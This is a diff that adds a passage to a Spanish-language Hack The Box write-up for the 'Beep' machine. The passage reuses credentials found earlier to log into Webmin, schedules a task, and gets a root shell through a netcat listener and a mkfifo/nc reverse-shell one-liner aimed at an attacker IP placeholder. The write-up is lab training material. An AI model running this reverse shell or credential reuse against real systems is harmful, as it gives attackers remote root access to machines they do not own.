@@ -181,6 +181,33 @@ Al habernos conectado a la máquina directamente como root, no es necesario real
 
 Al igual que intentamos probar contraseñas por defecto en el panel de login del servicio `Elastix`, podemos hacer lo mismo en el panel de autenticación del servicio `Webmin`, pero al igual que ocurrió antes, las [siguientes](https://help.eset.com/era_deploy_va/64/en-US/index.html?webmin.htm) credenciales no nos permiten ingresar.
 
+Otra opción muy buena sería utilizar las credenciales que encontramos antes, las cuales de hecho funcionan, es decir, se están reutilizando credenciales, otra muy mala práctica que aún a día de hoy, persiste.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/18.png)
+
+Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una `reverse shell`; [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de `NetCat`.
+
+Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.
+
+```
+sudo nc -nlvp <puertoCualquiera>
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/19.png)
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <direcciónIP> <puertoCualquiera> >/tmp/f
+```
+[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/20.png)
+
+Después de darle a `save`, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.
+
+[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/21.png)
+
+De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.
+
+[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/22.png)
+
 ### [](#header-4)Fase De Explotación - File Upload Bypass
 
 GHI
